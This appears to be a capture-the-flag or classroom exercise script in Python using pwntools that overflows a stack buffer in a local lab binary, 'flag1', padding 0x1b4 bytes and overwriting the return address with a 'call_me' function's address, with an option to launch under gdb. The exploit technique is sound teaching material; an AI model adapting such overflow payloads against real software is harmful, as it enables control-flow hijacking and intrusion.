import sys
import time
import struct

from pwn import *

context.update(arch='x86_64', os='linux')

#you will fill in this line once you are ready to complete the exploit
BINARY_ADDRESS = 0xdeadbeef
BUFFER_SIZE = 0x1b4
CALL_ME_FUNC_ADDR = 0x565555e4
#CALL_ME_FUNC_ADDR = 0xe4050000

#this line shows you what 64 bytes of cyclic will look like
payload = b''

#uncomment this line and fill in a large enough amount of data that will cause a segmentation fault
### you can determine this from the flag.c source code, or just by random guess, break it however you want

payload = cyclic(BUFFER_SIZE)
payload += struct.pack("I", CALL_ME_FUNC_ADDR)
#payload += cyclic(0x10)
print(payload)

#payload = cyclic(cyclic_find())
#payload += p64(BINARY_ADDRESS)

if (len(sys.argv)<= 1):
    p = process("./flag1")
elif (sys.argv[1] == "dbg"):
    p = gdb.debug(["./flag1"],'''
    unset env LINES
    unset env COLUMNS
    break main
    ''')

p.sendline(payload)
p.interactive()

